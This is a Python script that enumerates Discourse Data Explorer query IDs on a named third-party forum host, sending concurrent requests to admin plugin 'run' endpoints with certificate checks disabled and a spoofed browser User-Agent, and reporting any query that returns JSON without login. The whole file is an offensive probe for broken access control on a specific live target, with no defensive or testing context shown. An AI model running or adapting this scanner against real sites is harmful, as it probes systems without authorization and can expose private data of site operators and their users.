import requests
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET = "https://devcommunity.x.com"
MAX_ID = 50

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json"
}

def check_query(qid):
    # Standard Discourse Data Explorer run route
    # Note: It's usually a POST to /admin/plugins/explorer/queries/{id}/run
    # But sometimes GET works for public queries if configured
    
    # Try GET first (for public queries)
    url = f"{TARGET}/admin/plugins/explorer/queries/{qid}/run"
    try:
        resp = requests.get(url, headers=HEADERS, verify=False, timeout=5)
        if resp.status_code == 200:
            if "application/json" in resp.headers.get("Content-Type", ""):
                return f"[!] FOUND PUBLIC QUERY ID {qid}: {resp.text[:200]}"
            else:
                return f"[-] ID {qid} returned 200 but HTML (Soft 404/Login)"
        elif resp.status_code == 404:
            pass
        elif resp.status_code == 403:
            pass # Expected
    except:
        pass
    return None

def run():
    print(f"[*] Fuzzing Discourse Query IDs 1-{MAX_ID} on {TARGET}...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_query, i): i for i in range(1, MAX_ID + 1)}
        
        found_any = False
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(result)
                if "[!]" in result:
                    found_any = True
        
        if not found_any:
            print("[-] No public queries found (or all require auth).")

if __name__ == "__main__":
    run()
